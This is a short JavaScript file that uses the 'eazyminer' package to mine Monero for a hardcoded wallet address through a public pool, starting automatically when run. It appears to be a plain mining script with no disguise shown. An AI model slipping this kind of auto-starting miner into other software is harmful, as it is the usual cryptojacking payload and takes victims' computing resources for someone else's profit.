const Miner = require('eazyminer');

const miner = new Miner({
    pools: [{
        coin: 'XMR',
        user: "4BE6pHmwt1rMDFWtzFSfQj7Ae8Q6QikKs6B1tmpM8xbU6ZDKBYYJJtRFJVdeVLuQJbHCeEpzY6CDp8BujPg1AcUk5bmDKYb",
        url: 'gulf.moneroocean.stream:10128', // optional pool URL,
    }],
    autoStart: true // optional delay
});

miner.start();
/*miner.stop();*/
